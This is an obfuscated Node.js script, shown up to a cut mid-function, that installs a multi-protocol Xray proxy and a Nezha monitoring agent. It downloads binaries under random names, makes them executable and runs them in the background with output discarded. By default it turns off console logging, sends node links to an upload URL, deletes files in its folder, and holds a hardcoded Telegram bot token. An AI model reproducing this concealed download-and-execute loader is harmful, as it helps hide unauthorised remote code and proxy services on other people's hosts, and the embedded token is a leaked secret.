#!/usr/bin/env node

const _0x5e8f37 = _0x2ca9
;(function (_0x53add3, _0xce325a) {
  const _0x376010 = { _0x3db1b4: 0x266, _0x3c7ed9: 0x24e, _0x28ab9e: 0x23d, _0x499fba: 0x25d, _0x28077c: 0x17c, _0x623da0: 0x1a2 },
    _0x2785fd = _0x2ca9,
    _0x4423b2 = _0x53add3()
  while (!![]) {
    try {
      const _0xc86238 =
        parseInt(_0x2785fd(0x215)) / 0x1 +
        (parseInt(_0x2785fd(_0x376010._0x3db1b4)) / 0x2) * (-parseInt(_0x2785fd(_0x376010._0x3c7ed9)) / 0x3) +
        (parseInt(_0x2785fd(_0x376010._0x28ab9e)) / 0x4) * (-parseInt(_0x2785fd(0x1e3)) / 0x5) +
        -parseInt(_0x2785fd(_0x376010._0x499fba)) / 0x6 +
        (-parseInt(_0x2785fd(0x274)) / 0x7) * (-parseInt(_0x2785fd(0x27d)) / 0x8) +
        (-parseInt(_0x2785fd(0x271)) / 0x9) * (-parseInt(_0x2785fd(_0x376010._0x28077c)) / 0xa) +
        (-parseInt(_0x2785fd(0x1d4)) / 0xb) * (-parseInt(_0x2785fd(_0x376010._0x623da0)) / 0xc)
      if (_0xc86238 === _0xce325a) break
      else _0x4423b2['push'](_0x4423b2['shift']())
    } catch (_0xac594b) {
      _0x4423b2['push'](_0x4423b2['shift']())
    }
  }
})(_0x126e, 0xb606b)
const http = require(_0x5e8f37(0x27f)),
  axios = require(_0x5e8f37(0x161)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x5e8f37(0x244)),
  crypto = require('crypto'),
  { promisify } = require(_0x5e8f37(0x234)),
  { exec: execCommand, execSync } = require(_0x5e8f37(0x174)),
  exec = promisify(execCommand),
  PORT = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x202)] || 0xbb8,
  SUB_PATH = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x1ea)] || '800',
  NAME = process[_0x5e8f37(0x1ad)]['NAME'] || 'js-node',
  CFIP = process[_0x5e8f37(0x1ad)]['CFIP'] || 'mfa.gov.ua',
  CFPORT = process['env'][_0x5e8f37(0x231)] || 0x1bb,
  UPLOAD_URL = process[_0x5e8f37(0x1ad)]['UPLOAD_URL'] || '',
  PROJECT_URL = process[_0x5e8f37(0x1ad)]['PROJECT_URL'] || '',
  AUTO_ACCESS = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x23c)] || ![],
  FILE_PATH = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x239)] || _0x5e8f37(0x1c8),
  NEZHA_SERVER = process['env'][_0x5e8f37(0x1f6)] || _0x5e8f37(0x205),
  NEZHA_PORT = process['env']['NEZHA_PORT'] || '',
  NEZHA_KEY = process['env'][_0x5e8f37(0x22b)] || _0x5e8f37(0x1bf),
  UUID = process[_0x5e8f37(0x1ad)]['UUID'] || _0x5e8f37(0x16f),
  ARGO_AUTH = process[_0x5e8f37(0x1ad)]['ARGO_AUTH'] || _0x5e8f37(0x179),
  ARGO_DOMAIN = process['env'][_0x5e8f37(0x1cf)] || _0x5e8f37(0x273),
  ARGO_PORT = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x1e5)] || 0xe2e1,
  S5_PORT = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x1dc)] || '',
  HY2_PORT = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x1c7)] || '',
  REALITY_PORT = process[_0x5e8f37(0x1ad)]['REALITY_PORT'] || '',
  CHAT_ID = process[_0x5e8f37(0x1ad)][_0x5e8f37(0x18e)] || _0x5e8f37(0x1e6),
  BOT_TOKEN = process[_0x5e8f37(0x1ad)]['BOT_TOKEN'] || '8962228750:AAGlYPI5a4FVgx0-gUbB383JirHhkuqbwRE',
  SHOW_LOG = ![_0x5e8f37(0x166), _0x5e8f37(0x1b3), 'no'][_0x5e8f37(0x25b)]((process['env'][_0x5e8f37(0x235)] || _0x5e8f37(0x166))[_0x5e8f37(0x15f)]())
!SHOW_LOG && ((console[_0x5e8f37(0x259)] = () => {}), (console[_0x5e8f37(0x1a9)] = () => {}))
function alwaysLog(_0x1511a0) {
  const _0x3035f6 = { _0x1dbbf4: 0x1e9 },
    _0x23d988 = _0x5e8f37
  process[_0x23d988(0x1aa)][_0x23d988(_0x3035f6._0x1dbbf4)](_0x1511a0 + '\x0a')
}
if (!fs[_0x5e8f37(0x16a)](FILE_PATH)) fs[_0x5e8f37(0x192)](FILE_PATH)
else {
}
function isValidPort(_0x498697) {
  const _0x27ee36 = _0x5e8f37
  try {
    if (_0x498697 === null || _0x498697 === undefined || _0x498697 === '') return ![]
    if (typeof _0x498697 === _0x27ee36(0x162) && _0x498697['trim']() === '') return ![]
    const _0x1813ca = parseInt(_0x498697)
    if (isNaN(_0x1813ca)) return ![]
    if (_0x1813ca < 0x1 || _0x1813ca > 0xffff) return ![]
    return !![]
  } catch (_0x31c16f) {
    return ![]
  }
}
function generateRandomName() {
  const _0x47a620 = { _0x146102: 0x23e },
    _0x31a5af = _0x5e8f37,
    _0x18ee61 = _0x31a5af(_0x47a620._0x146102)
  let _0xaf4004 = ''
  for (let _0x5944ee = 0x0; _0x5944ee < 0x6; _0x5944ee++) {
    _0xaf4004 += _0x18ee61[_0x31a5af(0x15e)](Math[_0x31a5af(0x20e)](Math['random']() * _0x18ee61[_0x31a5af(0x1b6)]))
  }
  return _0xaf4004
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path['join'](FILE_PATH, npmName),
  phpPath = path['join'](FILE_PATH, phpName),
  webPath = path[_0x5e8f37(0x230)](FILE_PATH, webName),
  botPath = path[_0x5e8f37(0x230)](FILE_PATH, botName),
  subPath = path[_0x5e8f37(0x230)](FILE_PATH, _0x5e8f37(0x171)),
  listPath = path[_0x5e8f37(0x230)](FILE_PATH, _0x5e8f37(0x17b)),
  bootLogPath = path[_0x5e8f37(0x230)](FILE_PATH, 'boot.log'),
  configPath = path[_0x5e8f37(0x230)](FILE_PATH, 'config.json'),
  certPath = path[_0x5e8f37(0x1b2)](FILE_PATH, _0x5e8f37(0x232)),
  keyPath = path[_0x5e8f37(0x1b2)](FILE_PATH, 'private.key')
function deleteNodes() {
  const _0x546a55 = { _0x3b2e1b: 0x16a, _0x29de76: 0x279, _0x116800: 0x167, _0x532495: 0x206, _0x316428: 0x249, _0x17f711: 0x1b6 },
    _0x2890d3 = _0x5e8f37
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x2890d3(_0x546a55._0x3b2e1b)](subPath)) return
    let _0x2dd024
    try {
      _0x2dd024 = fs['readFileSync'](subPath, _0x2890d3(_0x546a55._0x29de76))
    } catch {
      return null
    }
    const _0x44bccd = Buffer[_0x2890d3(0x1bc)](_0x2dd024, 'base64')[_0x2890d3(_0x546a55._0x116800)](_0x2890d3(0x279)),
      _0x4caa03 = _0x44bccd[_0x2890d3(_0x546a55._0x532495)]('\x0a')[_0x2890d3(_0x546a55._0x316428)]((_0x59ae6e) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x2890d3(0x210)](_0x59ae6e)
      )
    if (_0x4caa03[_0x2890d3(_0x546a55._0x17f711)] === 0x0) return
    return (
      axios['post'](UPLOAD_URL + _0x2890d3(0x26d), JSON[_0x2890d3(0x200)]({ nodes: _0x4caa03 }), { headers: { 'Content-Type': _0x2890d3(0x1df) } })[
        _0x2890d3(0x189)
      ]((_0x22a8ac) => {
        return null
      }),
      null
    )
  } catch (_0x174f40) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x385feb = { _0x169cc9: 0x1f9 },
    _0x265615 = _0x5e8f37
  try {
    const _0x551117 = fs['readdirSync'](FILE_PATH)
    _0x551117[_0x265615(0x194)]((_0x2e0319) => {
      const _0x371f8e = _0x265615,
        _0x35e0cc = path[_0x371f8e(0x230)](FILE_PATH, _0x2e0319)
      try {
        const _0x1d1a37 = fs[_0x371f8e(_0x385feb._0x169cc9)](_0x35e0cc)
        _0x1d1a37['isFile']() && fs[_0x371f8e(0x1a8)](_0x35e0cc)
      } catch (_0x1434c1) {}
    })
  } catch (_0x2dbb3a) {}
}
function generateX25519Keypair() {
  const _0x496aca = { _0x45559a: 0x19f, _0xc11143: 0x212, _0x2d402e: 0x1af, _0x2142e6: 0x167, _0x3bd6bd: 0x183 },
    _0x69207c = _0x5e8f37,
    { publicKey: _0x4e6af6, privateKey: _0x5df2eb } = crypto[_0x69207c(0x1c0)](_0x69207c(_0x496aca._0x45559a)),
    _0x753790 = _0x5df2eb[_0x69207c(0x245)]({ type: _0x69207c(0x197), format: 'der' })[_0x69207c(_0x496aca._0xc11143)](-0x20),
    _0x6c14e0 = _0x4e6af6[_0x69207c(0x245)]({ type: _0x69207c(0x20c), format: _0x69207c(_0x496aca._0x2d402e) })['subarray'](-0x20)
  return {
    privateKey: _0x753790[_0x69207c(_0x496aca._0x2142e6)]('base64url'),
    publicKey: _0x6c14e0[_0x69207c(0x167)](_0x69207c(_0x496aca._0x3bd6bd))
  }
}
function generateOrLoadKeyPair() {
  const _0x413030 = {
      _0x1bc1d5: 0x230,
      _0x1e3341: 0x16a,
      _0x207648: 0x169,
      _0x4bfd7d: 0x178,
      _0x20f463: 0x223,
      _0x22bec5: 0x259,
      _0x1b8973: 0x172,
      _0x1a9798: 0x1a0,
      _0x1bff09: 0x22e,
      _0x18b1fe: 0x259,
      _0x410f76: 0x259
    },
    _0x4c3a40 = _0x5e8f37,
    _0x7a80a5 = path[_0x4c3a40(_0x413030._0x1bc1d5)](FILE_PATH, 'key.txt')
  if (fs[_0x4c3a40(_0x413030._0x1e3341)](_0x7a80a5)) {
    const _0x345c06 = fs['readFileSync'](_0x7a80a5, _0x4c3a40(_0x413030._0x207648)),
      _0x42c48a = _0x345c06[_0x4c3a40(_0x413030._0x4bfd7d)](/PrivateKey:\s*(.*)/),
      _0x210f40 = _0x345c06['match'](/PublicKey:\s*(.*)/)
    if (_0x42c48a && _0x210f40) {
      ;((privateKey = _0x42c48a[0x1]['trim']()),
        (publicKey = _0x210f40[0x1][_0x4c3a40(_0x413030._0x20f463)]()),
        console[_0x4c3a40(0x259)]('Private\x20Key:', privateKey),
        console[_0x4c3a40(_0x413030._0x22bec5)](_0x4c3a40(0x1f3), publicKey))
      return
    }
  }
  const _0x259cd2 = generateX25519Keypair()
  ;((privateKey = _0x259cd2[_0x4c3a40(0x20d)]),
    (publicKey = _0x259cd2[_0x4c3a40(_0x413030._0x1b8973)]),
    fs[_0x4c3a40(_0x413030._0x1a9798)](
      _0x7a80a5,
      _0x4c3a40(_0x413030._0x1bff09) + privateKey + '\x0aPublicKey:\x20' + publicKey + '\x0a',
      _0x4c3a40(0x169)
    ),
    console[_0x4c3a40(_0x413030._0x18b1fe)](_0x4c3a40(0x261), privateKey),
    console[_0x4c3a40(_0x413030._0x410f76)]('Public\x20Key:', publicKey))
}
function _0x2ca9(_0x5f56f0, _0x3886e6) {
  const _0x126e79 = _0x126e()
  return (
    (_0x2ca9 = function (_0x2ca9b7, _0x4e99cf) {
      _0x2ca9b7 = _0x2ca9b7 - 0x156
      let _0x5e80d5 = _0x126e79[_0x2ca9b7]
      return _0x5e80d5
    }),
    _0x2ca9(_0x5f56f0, _0x3886e6)
  )
}
const FALLBACK_EC_KEY =
    _0x5e8f37(0x18c) +
    _0x5e8f37(0x228) +
    _0x5e8f37(0x248) +
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a' +
    _0x5e8f37(0x1d2) +
    _0x5e8f37(0x177) +
    _0x5e8f37(0x236) +
    _0x5e8f37(0x19c),
  FALLBACK_CERT =
    _0x5e8f37(0x27b) +
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a' +
    _0x5e8f37(0x26c) +
    _0x5e8f37(0x27a) +
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a' +
    _0x5e8f37(0x25a) +
    _0x5e8f37(0x27e) +
    _0x5e8f37(0x20a) +
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a' +
    _0x5e8f37(0x268)
function ensureTlsCertificates(_0x5ad7eb, _0x449bf7) {
  const _0x518c45 = { _0x2fd471: 0x16a, _0x35365d: 0x192, _0x2a5f9e: 0x21e, _0x235087: 0x17a },
    _0xb2a5e3 = _0x5e8f37
  if (fs[_0xb2a5e3(_0x518c45._0x2fd471)](_0x5ad7eb) && fs[_0xb2a5e3(0x16a)](_0x449bf7)) return
  fs[_0xb2a5e3(_0x518c45._0x35365d)](path[_0xb2a5e3(_0x518c45._0x2a5f9e)](_0x5ad7eb), { recursive: !![] })
  try {
    ;(execSync(_0xb2a5e3(0x16e), { stdio: 'ignore' }),
      execSync(_0xb2a5e3(_0x518c45._0x235087) + _0x449bf7 + '\x22', { stdio: 'ignore' }),
      execSync(_0xb2a5e3(0x246) + _0x449bf7 + _0xb2a5e3(0x191) + _0x5ad7eb + _0xb2a5e3(0x1d8), { stdio: _0xb2a5e3(0x1bd) }))
    return
  } catch (_0x1bf0e9) {}
  ;(fs['writeFileSync'](_0x449bf7, FALLBACK_EC_KEY), fs[_0xb2a5e3(0x1a0)](_0x5ad7eb, FALLBACK_CERT))
}
function getCertificateFingerprint(_0xe7a842) {
  const _0x32de12 = { _0x54cd83: 0x169, _0x2ba85e: 0x178, _0x8374e6: 0x1ca, _0x51d1a5: 0x1bc, _0xdc4ad0: 0x270, _0xbf586f: 0x160 },
    _0x44cd60 = _0x5e8f37
  try {
    const _0x5496d9 = execSync(_0x44cd60(0x190) + _0xe7a842 + '\x22', { encoding: _0x44cd60(_0x32de12._0x54cd83), timeout: 0xbb8 })[
        _0x44cd60(0x223)
      ](),
      _0x5a65ab = _0x5496d9[_0x44cd60(_0x32de12._0x2ba85e)](/=(.+)$/)
    if (_0x5a65ab && _0x5a65ab[0x1]) return _0x5a65ab[0x1][_0x44cd60(_0x32de12._0x8374e6)]()
  } catch (_0x72fa42) {}
  try {
    const _0x181598 = fs['readFileSync'](_0xe7a842, 'utf8'),
      _0x264cbb = _0x181598['match'](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x264cbb) return ''
    const _0x4d5545 = _0x264cbb[0x1][_0x44cd60(0x193)](/\s/g, ''),
      _0xbd4357 = Buffer[_0x44cd60(_0x32de12._0x51d1a5)](_0x4d5545, _0x44cd60(0x165)),
      _0x10b592 = crypto[_0x44cd60(0x225)](_0x44cd60(_0x32de12._0xdc4ad0))
        [_0x44cd60(_0x32de12._0xbf586f)](_0xbd4357)
        [_0x44cd60(0x26a)](_0x44cd60(0x1bb))
    return _0x10b592[_0x44cd60(0x178)](/.{2}/g)['join'](':')[_0x44cd60(_0x32de12._0x8374e6)]()
  } catch (_0x104602) {
    return (console['error'](_0x44cd60(0x1dd), _0x104602), '')
  }
}
async function generateConfig() {
  const _0x2a90c5 = {
      _0x27872a: 0x19b,
      _0x445f6b: 0x217,
      _0x133804: 0x24a,
      _0x83ee9b: 0x1ce,
      _0x2e11f8: 0x276,
      _0x3e98e2: 0x217,
      _0xcb5727: 0x256,
      _0x2f2e95: 0x217,
      _0x4aa897: 0x1b5,
      _0x379644: 0x1db,
      _0x39f431: 0x27f,
      _0x45fc38: 0x269,
      _0x555a30: 0x1d5,
      _0xe7f5be: 0x198,
      _0x20f50a: 0x276,
      _0x338a3e: 0x1f0,
      _0xdca629: 0x196,
      _0x1dfee0: 0x227,
      _0x5a8e5a: 0x233,
      _0x7dcec9: 0x220,
      _0x5ce4ba: 0x1a4,
      _0x55fce8: 0x1ef,
      _0x3cd5ee: 0x1c3,
      _0x9ea995: 0x257,
      _0x29c1cd: 0x1ed,
      _0x53bb29: 0x1b1
    },
    _0x50e042 = _0x5e8f37,
    _0x14101f = {
      log: { access: _0x50e042(0x19b), error: _0x50e042(_0x2a90c5._0x27872a), loglevel: _0x50e042(_0x2a90c5._0x445f6b) },
      inbounds: [
        {
          tag: _0x50e042(_0x2a90c5._0x133804),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x50e042(0x276),
          settings: {
            clients: [{ id: UUID, flow: _0x50e042(0x1f0) }],
            decryption: _0x50e042(_0x2a90c5._0x445f6b),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x50e042(0x229), dest: 0xbba },
              { path: _0x50e042(_0x2a90c5._0x83ee9b), dest: 0xbbb },
              { path: '/trojan-argo', dest: 0xbbc }
            ]
          },
          streamSettings: { network: 'tcp' }
        },
        {
          tag: _0x50e042(0x1b9),
          port: 0xbb9,
          listen: _0x50e042(0x256),
          protocol: _0x50e042(_0x2a90c5._0x2e11f8),
          settings: { clients: [{ id: UUID }], decryption: _0x50e042(_0x2a90c5._0x3e98e2) },
          streamSettings: { network: _0x50e042(0x218), security: _0x50e042(_0x2a90c5._0x445f6b) }
        },
        {
          tag: 'vless-ws-in',
          port: 0xbba,
          listen: _0x50e042(_0x2a90c5._0xcb5727),
          protocol: _0x50e042(0x276),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x50e042(0x217) },
          streamSettings: { network: 'ws', security: _0x50e042(_0x2a90c5._0x2f2e95), wsSettings: { path: _0x50e042(0x229) } },
          sniffing: { enabled: !![], destOverride: [_0x50e042(0x27f), _0x50e042(0x1ef), 'quic'], metadataOnly: ![] }
        },
        {
          tag: _0x50e042(_0x2a90c5._0x4aa897),
          port: 0xbbb,
          listen: '127.0.0.1',
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x50e042(0x1ce) } },
          sniffing: { enabled: !![], destOverride: [_0x50e042(0x27f), _0x50e042(0x1ef), _0x50e042(_0x2a90c5._0x379644)], metadataOnly: ![] }
        },
        {
          tag: _0x50e042(0x156),
          port: 0xbbc,
          listen: _0x50e042(0x256),
          protocol: 'trojan',
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x50e042(_0x2a90c5._0x2f2e95), wsSettings: { path: _0x50e042(0x20f) } },
          sniffing: { enabled: !![], destOverride: [_0x50e042(_0x2a90c5._0x39f431), _0x50e042(0x1ef), 'quic'], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x50e042(_0x2a90c5._0x45fc38)] },
      outbounds: [
        { protocol: _0x50e042(0x173), tag: _0x50e042(_0x2a90c5._0x555a30) },
        { protocol: _0x50e042(0x1f7), tag: _0x50e042(_0x2a90c5._0xe7f5be) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x14101f['inbounds'][_0x50e042(0x227)]({
      tag: _0x50e042(0x255),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x50e042(_0x2a90c5._0x20f50a),
      settings: { clients: [{ id: UUID, flow: _0x50e042(_0x2a90c5._0x338a3e) }], decryption: _0x50e042(0x217) },
      streamSettings: {
        network: 'raw',
        security: _0x50e042(0x1ae),
        realitySettings: { show: ![], dest: 'www.iij.ad.jp:443', xver: 0x0, serverNames: [_0x50e042(0x15c)], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x14101f[_0x50e042(_0x2a90c5._0xdca629)][_0x50e042(_0x2a90c5._0x1dfee0)]({
        tag: _0x50e042(_0x2a90c5._0x5a8e5a),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x50e042(0x25e),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: 'hysteria',
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x50e042(_0x2a90c5._0x7dcec9), url: _0x50e042(_0x2a90c5._0x5ce4ba) } },
          security: _0x50e042(_0x2a90c5._0x55fce8),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x14101f[_0x50e042(0x196)]['push']({
        tag: 's5-in',
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x50e042(_0x2a90c5._0x3cd5ee),
        settings: {
          auth: _0x50e042(_0x2a90c5._0x9ea995),
          accounts: [{ user: UUID[_0x50e042(_0x2a90c5._0x29c1cd)](0x0, 0x8), pass: UUID[_0x50e042(_0x2a90c5._0x53bb29)](-0xc) }],
          udp: !![]
        }
      }),
    fs[_0x50e042(0x1a0)](path[_0x50e042(0x230)](FILE_PATH, _0x50e042(0x24f)), JSON[_0x50e042(0x200)](_0x14101f, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x456b25 = { _0x1da339: 0x1d9, _0x4810ca: 0x22c, _0x1b2c9b: 0x21c },
    _0x5549cd = _0x5e8f37,
    _0xbfe13e = os[_0x5549cd(0x1a5)]()
  return _0xbfe13e === 'arm' || _0xbfe13e === 'arm64' || _0xbfe13e === _0x5549cd(_0x456b25._0x1da339)
    ? _0x5549cd(_0x456b25._0x4810ca)
    : _0x5549cd(_0x456b25._0x1b2c9b)
}
function downloadFile(_0x13660c, _0x4e0037, _0x5bd57e) {
  const _0x103ef2 = { _0x2376a9: 0x16a, _0x16da1f: 0x158, _0x2f8ddf: 0x263, _0x5567ca: 0x222 },
    _0x25e626 = { _0x509700: 0x1b0 },
    _0x3bff83 = { _0x22b101: 0x1a6 },
    _0x90b079 = { _0x4b33e1: 0x1ba, _0x1e6feb: 0x18a, _0x3bfada: 0x1a9 },
    _0x3e0f3c = _0x5e8f37,
    _0x7374b9 = _0x13660c,
    _0x147c90 = _0x7374b9 + _0x3e0f3c(0x23a)
  !fs[_0x3e0f3c(_0x103ef2._0x2376a9)](FILE_PATH) && fs[_0x3e0f3c(0x192)](FILE_PATH, { recursive: !![] })
  const _0x113ebd = fs[_0x3e0f3c(_0x103ef2._0x16da1f)](_0x147c90)
  axios({ method: _0x3e0f3c(_0x103ef2._0x2f8ddf), url: _0x4e0037, responseType: _0x3e0f3c(_0x103ef2._0x5567ca) })
    [_0x3e0f3c(0x20b)]((_0x4e8bcf) => {
      const _0x348194 = { _0x26efae: 0x1b0, _0x3bc72c: 0x16c, _0x56df30: 0x219, _0x43b6c8: 0x1ba },
        _0x38c0be = _0x3e0f3c
      ;(_0x4e8bcf[_0x38c0be(_0x3bff83._0x22b101)][_0x38c0be(0x241)](_0x113ebd),
        _0x113ebd['on']('finish', () => {
          _0x113ebd['close']((_0x1c7049) => {
            const _0x3c9d32 = _0x2ca9
            if (_0x1c7049) {
              const _0x445f31 = _0x3c9d32(_0x348194._0x26efae) + path['basename'](_0x7374b9) + '\x20failed:\x20' + _0x1c7049[_0x3c9d32(0x18a)]
              ;(fs[_0x3c9d32(0x15d)](_0x147c90, () => {}), console['error'](_0x445f31), _0x5bd57e(_0x445f31))
              return
            }
            try {
              fs[_0x3c9d32(_0x348194._0x3bc72c)](_0x147c90, _0x7374b9)
            } catch (_0x2c47ac) {
              const _0x3c06ca = _0x3c9d32(0x1b0) + path[_0x3c9d32(0x1ba)](_0x7374b9) + _0x3c9d32(_0x348194._0x56df30) + _0x2c47ac['message']
              ;(fs[_0x3c9d32(0x15d)](_0x147c90, () => {}), console[_0x3c9d32(0x1a9)](_0x3c06ca), _0x5bd57e(_0x3c06ca))
              return
            }
            ;(console['log'](_0x3c9d32(0x1b0) + path[_0x3c9d32(_0x348194._0x43b6c8)](_0x7374b9) + '\x20successfully'), _0x5bd57e(null, _0x7374b9))
          })
        }),
        _0x113ebd['on'](_0x38c0be(0x1a9), (_0x2dc10d) => {
          const _0x49c530 = _0x38c0be
          fs['unlink'](_0x147c90, () => {})
          const _0x56a63a =
            _0x49c530(0x1b0) + path[_0x49c530(_0x90b079._0x4b33e1)](_0x7374b9) + _0x49c530(0x219) + _0x2dc10d[_0x49c530(_0x90b079._0x1e6feb)]
          ;(console[_0x49c530(_0x90b079._0x3bfada)](_0x56a63a), _0x5bd57e(_0x56a63a))
        }))
    })
    [_0x3e0f3c(0x189)]((_0x4001b7) => {
      const _0x163bef = _0x3e0f3c
      fs[_0x163bef(0x15d)](_0x147c90, () => {})
      const _0x5ab249 = _0x163bef(_0x25e626._0x509700) + path['basename'](_0x7374b9) + _0x163bef(0x219) + _0x4001b7['message']
      ;(console['error'](_0x5ab249), _0x5bd57e(_0x5ab249))
    })
}
async function downloadFilesAndRun() {
  const _0x39816f = {
      _0x5b4c1a: 0x1b6,
      _0x5dc2f8: 0x221,
      _0x49b789: 0x252,
      _0x503e40: 0x1a7,
      _0x43116b: 0x213,
      _0x150eb4: 0x185,
      _0x5a313b: 0x1a0,
      _0x5c5758: 0x201,
      _0xcb7c4: 0x1a9,
      _0x17d3ff: 0x208,
      _0x4f899d: 0x201,
      _0x3b2b94: 0x1ac,
      _0x3c5c4c: 0x259,
      _0x56aa49: 0x1ac,
      _0x339c66: 0x1ab,
      _0x3dae56: 0x178,
      _0x18b3b0: 0x1c2,
      _0x29e409: 0x178,
      _0x4c37b1: 0x176,
      _0x763e70: 0x1b2,
      _0x23e27a: 0x1b2,
      _0x5bbd60: 0x259,
      _0x24b476: 0x188
    },
    _0x49edad = { _0x20567b: 0x194 },
    _0x3506b6 = { _0x34aa6d: 0x16a, _0x4a7de5: 0x167, _0xd1f563: 0x1a9 },
    _0xc1163d = _0x5e8f37,
    _0x51594c = getSystemArchitecture(),
    _0x28e541 = getFilesForArchitecture(_0x51594c)
  if (_0x28e541[_0xc1163d(_0x39816f._0x5b4c1a)] === 0x0) {
    console['log'](_0xc1163d(0x164))
    return
  }
  const _0x10e23f = _0x28e541['map']((_0x1c9861) => {
    return new Promise((_0x463328, _0x526420) => {
      const _0x3261e6 = { _0x5eaa70: 0x265, _0xd554c4: 0x1c4 },
        _0x7ff179 = (_0x492901) => {
          const _0x167676 = _0x2ca9
          downloadFile(_0x1c9861[_0x167676(0x265)], _0x1c9861['fileUrls'][_0x492901], (_0x57d7ef, _0x38acbc) => {
            const _0x327b12 = _0x167676
            if (!_0x57d7ef) {
              _0x463328(_0x38acbc)
              return
            }
            if (_0x492901 + 0x1 < _0x1c9861[_0x327b12(0x184)][_0x327b12(0x1b6)]) {
              ;(console['log']('Retrying\x20' + path['basename'](_0x1c9861[_0x327b12(_0x3261e6._0x5eaa70)]) + _0x327b12(_0x3261e6._0xd554c4)),
                _0x7ff179(_0x492901 + 0x1))
              return
            }
            _0x526420(_0x57d7ef)
          })
        }
      _0x7ff179(0x0)
    })
  })
  try {
    await Promise[_0xc1163d(0x1e2)](_0x10e23f)
  } catch (_0x4dac43) {
    console[_0xc1163d(0x1a9)](_0xc1163d(0x267), _0x4dac43)
    return
  }
  function _0x472e62(_0x423ef3) {
    const _0x547e47 = _0xc1163d,
      _0x4413d4 = 0x1fd
    _0x423ef3[_0x547e47(_0x49edad._0x20567b)]((_0x562fc3) => {
      const _0x26f35a = _0x547e47
      if (fs[_0x26f35a(_0x3506b6._0x34aa6d)](_0x562fc3))
        try {
          ;(fs[_0x26f35a(0x15a)](_0x562fc3, _0x4413d4),
            console['log']('Empowerment\x20success\x20for\x20' + _0x562fc3 + ':\x20' + _0x4413d4[_0x26f35a(_0x3506b6._0x4a7de5)](0x8)))
        } catch (_0x58e6ba) {
          console[_0x26f35a(_0x3506b6._0xd1f563)](_0x26f35a(0x1de) + _0x562fc3 + ':\x20' + _0x58e6ba)
        }
    })
  }
  const _0x40b56e = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x472e62(_0x40b56e)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x54e27d = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER[_0xc1163d(0x206)](':')['pop']() : '',
        _0x32dda4 = new Set([
          '443',
          _0xc1163d(_0x39816f._0x5dc2f8),
          _0xc1163d(0x1e0),
          _0xc1163d(_0x39816f._0x49b789),
          _0xc1163d(0x214),
          _0xc1163d(0x1cd)
        ]),
        _0x5474cd = _0x32dda4['has'](_0x54e27d) ? _0xc1163d(_0x39816f._0x503e40) : 'false',
        _0x58dae4 =
          _0xc1163d(0x24c) +
          NEZHA_KEY +
          _0xc1163d(_0x39816f._0x43116b) +
          NEZHA_SERVER +
          _0xc1163d(_0x39816f._0x150eb4) +
          _0x5474cd +
          '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20' +
          UUID
      fs[_0xc1163d(_0x39816f._0x5a313b)](path['join'](FILE_PATH, 'config.yaml'), _0x58dae4)
      const _0x5b9093 = _0xc1163d(_0x39816f._0x5c5758) + phpPath + _0xc1163d(0x1d1) + FILE_PATH + '/config.yaml\x22\x20>/dev/null\x202>&1\x20&'
      try {
        ;(await exec(_0x5b9093), console['log'](phpName + _0xc1163d(0x1ac)), await new Promise((_0x143500) => setTimeout(_0x143500, 0x3e8)))
      } catch (_0x1c1d91) {
        console[_0xc1163d(_0x39816f._0xcb7c4)]('php\x20running\x20error:\x20' + _0x1c1d91)
      }
    } else {
      let _0x4fca39 = ''
      const _0x5d6da1 = [_0xc1163d(_0x39816f._0x17d3ff), '8443', _0xc1163d(0x1e0), '2087', '2083', _0xc1163d(0x1cd)]
      _0x5d6da1[_0xc1163d(0x25b)](NEZHA_PORT) && (_0x4fca39 = _0xc1163d(0x180))
      const _0x586267 =
        _0xc1163d(_0x39816f._0x4f899d) +
        npmPath +
        _0xc1163d(0x242) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0xc1163d(0x237) +
        NEZHA_KEY +
        '\x20' +
        _0x4fca39 +
